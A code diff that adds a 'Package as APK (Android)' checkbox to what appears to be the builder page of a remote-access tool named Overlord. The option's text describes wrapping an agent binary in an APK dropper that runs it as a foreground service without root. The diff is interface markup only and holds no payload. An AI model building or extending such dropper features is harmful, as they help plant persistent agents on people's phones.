@@ -642,6 +642,18 @@
                       </p>
                     </div>
 
+                    <div id="android-apk-container">
+                      <label class="flex items-center gap-2 p-3 bg-green-900/20 border border-green-500/30 rounded-lg cursor-pointer hover:border-green-400 transition-colors">
+                        <input type="checkbox" name="build-apk" id="build-apk" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span class="flex items-center gap-2">
+                            <i class="fa-brands fa-android text-green-400"></i> Package as APK (Android)
+                          </span>
+                          <span class="text-xs text-slate-500">Wrap the Android agent binary inside an APK dropper. The APK extracts the agent to private storage and runs it as a foreground service. No root required.</span>
+                        </div>
+                      </label>
+                    </div>
+
                     <div id="ios-bundle-id-container" class="hidden">
                       <label class="block text-sm font-medium text-slate-300 mb-2" for="ios-bundle-id">iOS Bundle ID</label>
                       <input type="text" id="ios-bundle-id" name="ios-bundle-id" placeholder="com.overlord.agent (default)"
